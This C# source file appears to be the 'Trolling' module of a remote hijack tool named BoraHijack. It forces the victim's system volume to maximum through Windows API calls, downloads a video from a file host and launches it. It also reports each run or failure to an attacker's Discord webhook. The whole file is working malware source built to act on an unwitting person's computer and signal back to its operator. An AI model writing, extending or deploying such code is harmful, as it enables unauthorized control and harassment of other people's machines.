using System;
using System.Runtime.InteropServices;
using System.Threading;
using Discord;
using Discord.Webhook;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace BoraHijack
{
    class Trolling
    {
        private const int WM_APPCOMMAND = 0x319;
        private const int APPCOMMAND_VOLUME_UP = 0x0A;
        private const int APPCOMMAND_VOLUME_DOWN = 0x09;
        private const int APPCOMMAND_VOLUME_MUTE = 0x08;

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(
            IntPtr hWnd,
            int Msg,
            IntPtr wParam,
            IntPtr lParam
        );

        public async static Task Calljobs(string webhookUrl)
        {
            VolumeMax();
            await Videosndpics(webhookUrl);
        }

        public static void VolumeMax()
        {
            IntPtr handle = GetDesktopWindow();

            for (int i = 0; i < 70; i++)
            {
                SendMessageW(handle, WM_APPCOMMAND, handle, (IntPtr)(APPCOMMAND_VOLUME_UP * 0x10000));
                Thread.Sleep(50);
            }
        }

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        public async static Task Videosndpics(string webhookUrl)
        {
            string[] videoUrls = new string[]
            {
                "https://files.catbox.moe/cv5e90.mp4"
            };

            using (HttpClient client = new HttpClient())
            {
                for (int i = 0; i < videoUrls.Length; i++)
                {
                    string url = videoUrls[i];
                    string fileName = $"{i + 1}.mp4";

                    try
                    {
                        using (HttpResponseMessage response = await client.GetAsync(url))
                        {
                            response.EnsureSuccessStatusCode();

                            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                            {
                                await response.Content.CopyToAsync(fs);
                            }
                        }

                        var client2 = new DiscordWebhookClient(webhookUrl);

                        await client2.SendMessageAsync(
                            text: "",
                            username: "BoraHijack",
                            avatarUrl: "https://files.catbox.moe/zteeqk.png",
                            isTTS: false,
                            embeds: new[] { new EmbedBuilder()
                            .WithTitle("Trolling :smiling_imp:")
                            .WithDescription("Trolling Module has started!")
                            .Build()
                            });

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = fileName,
                            UseShellExecute = true // Opens with default media player on Windows
                        });
                    }
                    catch (Exception ex)
                    {
                        var client3 = new DiscordWebhookClient(webhookUrl);

                        await client3.SendMessageAsync(
                            text: "",
                            username: "BoraHijack",
                            avatarUrl: "https://files.catbox.moe/zteeqk.png",
                            isTTS: false,
                            embeds: new[] { new EmbedBuilder()
                            .WithTitle("Trolling failed")
                            .WithDescription($"Failed to download or play {url}: {ex.Message}" )
                            .Build()
                        });
                    }
                }
            }
        }
    }
}
